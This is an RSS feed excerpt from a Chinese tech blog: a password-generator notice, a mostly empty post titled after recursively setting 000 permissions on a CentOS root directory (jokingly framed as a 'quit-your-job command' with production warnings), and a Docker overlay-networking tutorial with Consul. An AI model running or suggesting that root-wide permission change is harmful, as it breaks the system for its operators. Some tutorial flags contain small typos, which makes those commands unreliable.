      <content:encoded><![CDATA[
<blockquote>
<p>生成随机密码。</p>
<p>密码随机生成是一个用于生成随机密码的工具。它可以帮助用户创建强密码，以提高帐户的安全性。</p>
</blockquote>
<p>源码开源在 <a href="https://github.com/Paper-Dragon/GeneratePassword" target="_blank" rel="noopener noreferrer">GitHub 仓库</a> , 目前已经更新为vue版本。</p>
]]></content:encoded>
    </item>
    <item>
      <title>CentOS的灾难恢复-chmod对整个根目录赋予000权限</title>
      <link>https://www.geekery.cn/note-book/OperaSystems/RedHatEnterpriseLinux/CentOS%E7%9A%84%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D-chmod%E5%AF%B9%E6%95%B4%E4%B8%AA%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%B5%8B%E4%BA%88000%E6%9D%83%E9%99%90.html</link>
      <guid>https://www.geekery.cn/note-book/OperaSystems/RedHatEnterpriseLinux/CentOS%E7%9A%84%E7%81%BE%E9%9A%BE%E6%81%A2%E5%A4%8D-chmod%E5%AF%B9%E6%95%B4%E4%B8%AA%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%B5%8B%E4%BA%88000%E6%9D%83%E9%99%90.html</guid>
      <source url="https://www.geekery.cn/rss.xml">CentOS的灾难恢复-chmod对整个根目录赋予000权限</source>
      <description>CentOS的灾难恢复-chmod对整个根目录赋予000权限 每日一个跑路小命令，没准哪天能用上呢【滑稽】，切勿在生产环境使用，切勿在生产环境使用，切勿在生产环境使用 命令解释 命令是 结果展示 解决方法</description>
      <pubDate>Mon, 10 Jun 2024 06:02:26 GMT</pubDate>
      <content:encoded><![CDATA[
<blockquote>
<p><strong>每日一个跑路小命令，没准哪天能用上呢【滑稽】，切勿在生产环境使用，切勿在生产环境使用，切勿在生产环境使用</strong></p>
</blockquote>
<h2>命令解释</h2>
<p>命令是</p>
<h2>结果展示</h2>
<h2>解决方法</h2>
]]></content:encoded>
    </item>
    <item>
      <title>Docker跨宿主机通信overlay和macvlay</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E8%B7%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E9%80%9A%E4%BF%A1overlay%E5%92%8Cmacvlay.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E8%B7%A8%E5%AE%BF%E4%B8%BB%E6%9C%BA%E9%80%9A%E4%BF%A1overlay%E5%92%8Cmacvlay.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker跨宿主机通信overlay和macvlay</source>
      <description>Docker跨宿主机通信overlay和macvlay 前言 本讲是从Docker系列讲解课程，单独抽离出来的一个小节，带你一起 深入了解在编排工具出现前，跨宿主机通信的两大得力干将overlay、macvlay，这也会后期学好K8s做好基本功铺垫，打下一个坚实的基础。 一、overlay Overlay网络模式相比于桥接模式的特别之处在于，它可以自定...</description>
      <pubDate>Fri, 07 Jun 2024 19:15:21 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>前言</h2>
<blockquote>
<p>本讲是从Docker系列讲解课程，单独抽离出来的一个小节，带你一起 深入了解在编排工具出现前，跨宿主机通信的两大得力干将overlay、macvlay，这也会后期学好K8s做好基本功铺垫，打下一个坚实的基础。</p>
</blockquote>
<h2>一、overlay</h2>
<blockquote>
<p>Overlay网络模式相比于桥接模式的特别之处在于，它可以自定多个--subnet子网网段，只有同一网络/段中的容器才可以相互交换信息（相互通信）。</p>
<p>需要注意的是如果设置了多个--subnet，也需要同步设定对应个数的--gateway网关，需要确保各子网网段不重叠。</p>
<p>如何查看容器的子网网段，docker insect contain_name即可，当然在docker run 容器时，也可以通过--subnet 指定子网网段 。</p>
</blockquote>
<p>示例（了解范畴）：</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> overlay</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.168.0.0/16</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 192.170.0.0/16</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.168.0.100</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 192.170.0.100</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ip-range=192.168.1.0/24</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-address=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-router=192.168.1.5"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-adress=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-switch=192.168.1.16"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-address=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-router=192.170.1.5"</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --aux-adress=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"my-switch=192.170.1.16"</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> myoverlaynet</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>预告</h3>
<blockquote>
<p>通过对本知识点的学习，你将掌握，通过docker create 自定义网络-d自定义网络指定为overlay 网络模式，从而实现跨宿主机通信，同时可以了解一下consul镜像的使用。</p>
</blockquote>
<p>注： Consul是一个分布式、高可用性和多数据中心感知工具，用于服务发现、配置和编排。Consul 支持大规模快速部署、配置和维护面向服务的架构。欲了解更多信息，请参阅 Consul架构指南。</p>
<h3>1.docker pull 拉取consul镜像，并运行容器</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #拉取镜像</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 8500:8500</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul:latest</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #启动sonsul容器</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">netstat</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -nalpt</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #查看端口占用情况</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3>2.修改主/从节点的daemon.json，并重启docker和consul服务</h3>
<h4>1）修改主节点CentOS 7.9</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>注：在修改之前，你本地的这个文件可能只有一行，大概应该是仅配了（阿里）镜像加速。可参考如下配置，前两行可以不配置，使用默认的就可以。最后三行是要配的。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">{</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "graph"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"/var/lib/docker"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "storage-driver"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"overlay"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "registry-mirrors"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: [</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.zhai.cm"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://a.ussh.net"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.littlediary.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://hub.rat.dev"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://atomhub.openatom.cn"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.m.daocloud.io"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.1ms.run"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dytt.online"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://func.ink"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://lispy.org"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.xiaogenban1993.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.mybacc.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://docker.yomansunter.com"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">    "https://dockerhub.websoft9.com"</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">  ],</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-store"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"consul://192.168.31.100:8500"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "cluster-advertise"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"192.168.31.100:2375"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75">  "live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">: </span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">}</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注意：修改的时候，注意引号要是英文的，除最后一行外，前面的每行尾部都有一个英文逗号（否则docker服务将无法正常启动！！）。</p>
<p>首行的graph是配置docker数据（镜像、容器等）默认存储位置，可以据需修改，默认位置就是/var/lib/docker，（有人习惯修改为/data/docker）。
第二行的storage-driver，是驱动模式指定为overlay。
第三行是配置的阿里云镜像仓库地址
第四行cluster-store，是配置sonsul集群的访问地址
第五行cluster-advertise，是广播通信地址和端口。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">"live-restore"</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">:true</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> 和</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">  –restart=always用法和意义各不相同。</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>配置前者的意义在于即使docker的daemon守护进程关闭，其里面的容器依然保持运行，后者是指容器在docker run 启动时，佩带了该参数，则在出现故障（内存泄露等）时，自动重启容器。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #使daemon.json重新生效</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #重启docker</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #可以看到consul的状态是Exited</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> start</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> consul</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #再次手动启动consul容器</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><a href="http://192.168.31.100:8500" target="_blank" rel="noopener noreferrer">http://192.168.31.100:8500</a> 访问consul（这个IP地址是在上面的/etc/docker/daemon.json中配置的）</p>
<h4>2）修改从节点CentOS8.4</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vim</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /etc/docker/daemon.json</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>有了上面配置的基础，从节点配置简单一点，其他配使用默认就可以。仅配置下面的三行。需要注意的是集群广播监听的地址cluster-advertise，要配置为从节点自己的IP。</p>
<div class="language-json line-numbers-mode" data-highlighter="shiki" data-ext="json" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"cluster-store"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"consul://192.168.31.100:8500"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"cluster-advertise"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"192.168.31.130:2375"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"live-restore"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span><span style="--shiki-light:#0184BC;--shiki-dark:#D19A66">true</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>切记：除最后一行外，每行配置末尾都有英文逗号！！！cluster-store是集群中主节点访问地址；cluster-advertise是当前节点的IP和广播端口，别误写成主节点的IP了，否则docker无法重启 ,错误如下: "systemctl status network.service" and "journalctl -xe" for details。</p>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> daemon-reload</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #使daemon.json重新生效</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> restart</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> docker</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #重启docker</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div></div></div><h3>3.在主节点创建overlay网络后，分别在主、从节点查看</h3>
<h4>1）创建前自定义网络前，分别查看主从节点的已有网络（便于对比效果）</h4>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">  #分别在主从节点执行该查代码</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h4>2）在master主节点CentOS 7.9 上创建自定义网络mynet</h4>
<h1>在主节点创建自定义网络：分别指定网络模式、子网网段、网关、网卡最大传输单元 ，更详细参数见：</h1>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --help</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> create</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --driver</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> overlay</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --ingress</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --subnet=172.31.0.0/16</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --gateway=172.31.0.2</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> \</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --opt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> com.docker.network.driver.mtu=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">1200</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ls</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>注： com.docker.network.driver.mtu 等价于--mtu，用来设置容器网卡最大传输单元</p>
<p>可以看到自定义网络mynet创建成功，创建时指定网络模式为overlay</p>
<p>提示：如果创建时错误提示Error response from daemon: error getting pools config from store: could not get pools config from store，docker start consul 重新启动容器服务即可。</p>
<h4>3）切回从节点 CentOS 8.4 ，查看在 CentOS 7.9 主节点创建的网络</h4>
<p>发现，从节点CentOS8.4上，可以看到主节点创建的mynet自定义网络，而本身并没有创建这个网络，原理就是通过/etc/docker/daemon.json中的配置集群信息的集群地址cluster-store和广播cluster-advertise来实现主从共享网络的。</p>
<h3>4.在主节点使用自定义的overlay网络模式启动nginx，并查看其I</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> </span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> run</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -d</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --network</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> mynet</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --name</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx:alpine</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">   #主节点使用自定义网络启动</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> inspect</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> nginx</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"> #查看网络详细信息</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>主节点nginx的虚拟IP地址：172.31.0.1</p>
<h3>5.在从节点上使用自定义的overlay网络模式开启tomcat，尝试和nginx互通</h3>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> images</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">docker</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> ps</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> -a</span></span>
